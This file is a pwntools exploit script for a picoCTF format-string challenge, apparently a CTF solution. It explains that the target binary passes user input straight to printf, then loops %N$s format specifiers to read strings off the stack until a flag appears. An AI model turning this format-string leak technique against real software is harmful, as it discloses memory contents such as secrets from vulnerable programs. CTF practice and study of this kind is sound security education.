#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

log.info("""this is a fairly basic uncontrolled format string bug. reads in user input, passes it directly to printf:

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \\n");
   printf(story);                  // <<<< VULN IS HERE :)

There's more meticulous ways to do this, but I'm lazy so we're just going to trawl the stack until we find the flag.
""")

for i in range(50):
    io = start(level='error')

    io.readuntil(b"Tell me a story and then I'll tell you one >> ")
    io.sendline(f"%{i}$s".encode('latin1'))
    io.readuntil(b"Here's a story - \n")
    try:
        output = io.readline().decode('latin1')
    except:
        continue
    if "{" in output and "}" in output:
        log.warning("flag should look like picoCTF{...} .... you might need to fix it a little")
        log.success(output)
        
        exit(0)
    io.close() # not found

io.interactive()

